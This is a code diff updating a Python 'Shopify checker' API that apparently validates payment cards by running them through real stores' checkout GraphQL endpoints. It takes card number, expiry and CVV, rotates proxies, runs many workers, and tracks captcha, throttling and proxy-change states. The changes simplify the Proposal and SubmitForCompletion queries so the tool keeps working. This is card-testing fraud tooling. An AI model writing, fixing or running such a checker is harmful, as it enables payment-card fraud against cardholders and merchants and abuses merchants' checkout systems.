@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-Jinx API — ShopifyK-Based Shopify Checker (v6.2 FINAL)
-========================================================
-Based on ShopifyK.py workflow
+Jinx API — ShopifyK-Based Shopify Checker (v6.3 FINAL FIXED)
+==============================================================
 FIXED:
-  - GraphQL union type error (Selections can't be made directly on unions)
-  - $$0.25 → $0.25
+  - GraphQL syntax error (ultra simple query)
+  - $$4.00 → $4.00
   - UNKNOWN_ERROR → tigyi error codes
-  - Session token OK → continue to proposal
+  - Session token OK → continue
 """
 
 import os
@@ -42,7 +41,7 @@ except ImportError:
 
 
 BRAND = "Jinx"
-VERSION = "6.2.0"
+VERSION = "6.3.0"
 HOST = os.environ.get("API_HOST", "0.0.0.0")
 PORT = int(os.environ.get("PORT", "8080"))
 WORKERS = int(os.environ.get("API_WORKERS", "20"))
@@ -168,7 +167,6 @@ def extract_between(text, start, end):
 
 
 def clean_price(raw):
-    """Remove $ signs and make sure single $ prefix"""
     if raw is None:
         return "-"
     s = str(raw).strip()
@@ -216,61 +214,43 @@ def extract_clean_response(message):
     return message[:50]
 
 
-# ═══ FIXED QUERIES (GraphQL union type safe) ═══
+# ═══ ULTRA SIMPLE QUERIES (syntax error safe) ═══
 PROPOSAL_QUERY = (
     "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
     "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
     "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
-    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
-    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
-    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
-    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
+    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String){"
     "session(sessionInput:$sessionInput){"
     "negotiate(input:{"
     "purchaseProposal:{"
     "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
-    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
-    "nonNegotiableTerms:$nonNegotiableTerms,"
-    "localizationExtension:$localizationExtension,"
-    "scriptFingerprint:$scriptFingerprint,"
-    "optionalDuties:$optionalDuties,captcha:$captcha},"
+    "buyerIdentity:$buyerIdentity,taxes:$taxes},"
     "checkpointData:$checkpointData,"
     "queueToken:$queueToken}){"
-    "__typename "
-    "result{"
+    "__typename result{"
     "... on NegotiationResultAvailable{"
     "checkpointData queueToken "
     "sellerProposal{"
+    "__typename "
     "runningTotal{value{amount currencyCode}}"
-    "delivery{"
-    "... on FilledDeliveryTerms{"
-    "deliveryLines{id "
+    "delivery{__typename "
+    "deliveryLines{"
+    "id "
     "availableDeliveryStrategies{"
     "handle "
     "amount{value{amount currencyCode}}"
     "}"
     "}"
     "}"
-    "}"
-    "payment{"
-    "... on FilledPaymentTerms{"
+    "payment{__typename "
     "availablePaymentLines{"
-    "paymentMethod{"
-    "name paymentMethodIdentifier"
-    "}"
-    "}"
-    "}"
-    "}"
-    "tax{"
-    "... on FilledTaxTerms{"
-    "totalTaxAmount{value{amount currencyCode}}"
+    "paymentMethod{name paymentMethodIdentifier __typename}"
     "}"
     "}"
     "}"
     "}"
     "... on CheckpointDenied{redirectUrl}"
     "... on Throttled{pollAfter queueToken pollUrl}"
-    "... on NegotiationResultFailed{__typename}"
     "}"
     "errors{code localizedMessage}"
     "}"
@@ -279,11 +259,9 @@ PROPOSAL_QUERY = (
 
 SUBMIT_QUERY = (
     "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
-    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
-    "$analytics:AnalyticsInput){"
+    "$metafields:[MetafieldInput!],$analytics:AnalyticsInput){"
     "submitForCompletion(input:$input attemptToken:$attemptToken "
-    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
-    "analytics:$analytics){"
+    "metafields:$metafields analytics:$analytics){"
     "... on SubmitSuccess{receipt{id token}}"
     "... on SubmitAlreadyAccepted{receipt{id token}}"
     "... on SubmitFailed{reason}"
@@ -307,7 +285,6 @@ POLL_QUERY = (
 )
 
 
-# ═══ ShopifyK.py PROCESS_CARD (Async) ═══
 async def fetch_products(domain, proxy_str=None):
     try:
         if not domain.startswith('http'):
@@ -367,7 +344,6 @@ async def make_graphql_request(session, graphql_url, params, headers, json_data)
 
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, debug_log=None):
-    """Full ShopifyK.py logic"""
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -519,8 +495,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'expectedTotalPrice': {'any': True},
                         'destinationChanged': True}],
                         'noDeliveryRequired': [], 'useProgressiveRates': False,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True},
+                        'prefetchShippingRatesStrategy': None},
                     'merchandise': {'merchandiseLines': [{
                         'stableId': stableId or '1',
                         'merchandise': {'productVariantReference': {
@@ -542,19 +517,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'marketingConsent': [{'email': {'value': email}}],
                         'shopPayOptInPhone': {'countryCode': country_code},
                         'rememberMe': False},
-                    'tip': {'tipLines': []},
                     'taxes': {'proposedAllocations': None,
                         'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                         'proposedTotalIncludedAmount': None,
                         'proposedMixedStateTotalAmount': None,
                         'proposedExemptions': []},
-                    'note': {'message': None, 'customAttributes': []},
-                    'localizationExtension': {'fields': []},
-                    'nonNegotiableTerms': None,
-                    'scriptFingerprint': {'signature': None, 'signatureUuid': None,
-                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
-                        'shippingScriptChanges': []},
-                    'optionalDuties': {'buyerRefusesDuties': False},
                 },
                 'operationName': 'Proposal',
             }
@@ -580,9 +547,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if 'errors' in resp_json:
                 error_msgs = [e.get('message', str(e)) for e in resp_json['errors'][:3]]
                 clean = extract_clean_response("; ".join(error_msgs))
-                if 'union' in clean.lower() or 'selections' in clean.lower():
-                    dbg(f"GraphQL Schema Error: {clean}")
-                    return False, "GRAPHQL_SCHEMA_ERROR", gateway, total_price, currency
                 dbg(f"GraphQL Error: {clean}")
                 return False, clean, gateway, total_price, currency
 
@@ -625,14 +589,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         except Exception:
                             shipping_amount = 0.0
 
-            try:
-                tax_data = seller_proposal.get('tax', {})
-                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
-                    tax_amount = float(tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
-                else:
-                    tax_amount = 0.0
-            except Exception:
-                tax_amount = 0.0
+            # tax_amount = 0 (removed from query)
+            tax_amount = 0.0
 
             payment_data = seller_proposal.get('payment', {})
             payment_identifier = None
@@ -716,8 +674,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'amount': str(shipping_amount), 'currencyCode': currency}},
                         'destinationChanged': False}],
                         'noDeliveryRequired': [], 'useProgressiveRates': True,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True},
+                        'prefetchShippingRatesStrategy': None},
                     'merchandise': {'merchandiseLines': [{
                         'stableId': stableId or '1',
                         'merchandise': {'productVariantReference': {
@@ -756,11 +713,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                         'proposedTotalIncludedAmount': None,
                         'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
-                    'tip': {'tipLines': []},
-                    'note': {'message': None, 'customAttributes': []},
-                    'localizationExtension': {'fields': []},
-                    'nonNegotiableTerms': None,
-                    'optionalDuties': {'buyerRefusesDuties': False}},
+                },
                 'attemptToken': attempt_token,
                 'metafields': [],
                 'analytics': {'requestUrl': checkout_url},
@@ -1015,7 +968,7 @@ def run_check(site, cc, proxy=None, debug=False):
         "SITE", "PROXY", "CAPTCHA", "THROTTLED", "CHECKPOINT", "REQUEST",
         "INVALID_JSON", "PROPOSAL", "NO_SESSION", "NO_DELIVERY", "NO_PAYMENT",
         "VAULT", "EMPTY_SUBMIT", "SUBMIT_PARSE", "POLL", "CHANGE_PROXY",
-        "EXCEPTION", "GRAPHQL_SCHEMA"
+        "EXCEPTION", "GRAPHQL"
     )):
         status = "Site Error"
     else:
@@ -1121,7 +1074,7 @@ executor = ThreadPoolExecutor(max_workers=WORKERS)
 def main():
     print()
     print("╔══════════════════════════════════════════════════════════╗")
-    print(f"║  {BRAND} API v{VERSION} (ShopifyK FIXED)                    ║")
+    print(f"║  {BRAND} API v{VERSION} (FINAL FIXED)                      ║")
     print("╚══════════════════════════════════════════════════════════╝")
     print(f"  Listening : http://{HOST}:{PORT}")
     print(f"  Workers   : {WORKERS}")
